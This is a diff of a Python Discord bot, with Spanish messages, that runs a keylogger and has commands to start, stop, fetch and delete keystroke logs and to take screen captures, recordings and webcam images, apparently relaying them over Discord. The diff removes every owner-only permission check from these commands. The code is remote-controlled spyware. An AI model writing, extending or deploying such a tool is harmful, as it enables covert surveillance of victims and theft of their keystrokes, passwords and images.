@@ -27,19 +27,16 @@ async def on_ready():
     key_logger.listen_thread()
 
 @bot.command()
-@commands.is_owner()
 async def stoplogs(ctx):
     await ctx.send("Deteniendo logger")
     key_logger.stop_thread()
     
 @bot.command()
-@commands.is_owner()
 async def startlogs(ctx):
     await ctx.send("Iniciando logs")
     key_logger.listen_thread()
     
 @bot.command()
-@commands.is_owner()
 async def deletelogs(ctx):
     "se necesitan permisos de admin"
     await ctx.send("Borrando logs antiguos")
@@ -51,7 +48,6 @@ async def deletelogs(ctx):
         await ctx.send("Archivos no existentes")
         
 @bot.command()
-@commands.is_owner()
 async def logs(ctx):
     "se necesitan permisos de admin"
     try:
@@ -61,7 +57,6 @@ async def logs(ctx):
         await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
-@commands.is_owner()
 async def capture(ctx):
     "se necesitan permisos de admin"
     try:
@@ -73,7 +68,6 @@ async def capture(ctx):
         await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
-@commands.is_owner()
 async def record(ctx):
     "Se necesitan permisos del admin "
     try:
@@ -86,7 +80,6 @@ async def record(ctx):
         await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
-@commands.is_owner()
 async def webcam(ctx):
     "se necesitan permisos del admin"
     try:
@@ -105,7 +98,6 @@ async def webcam(ctx):
         await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
-@commands.is_owner()
 async def die(ctx):
     "se necesitan permisos de admin"
     key_logger.stop_thread()
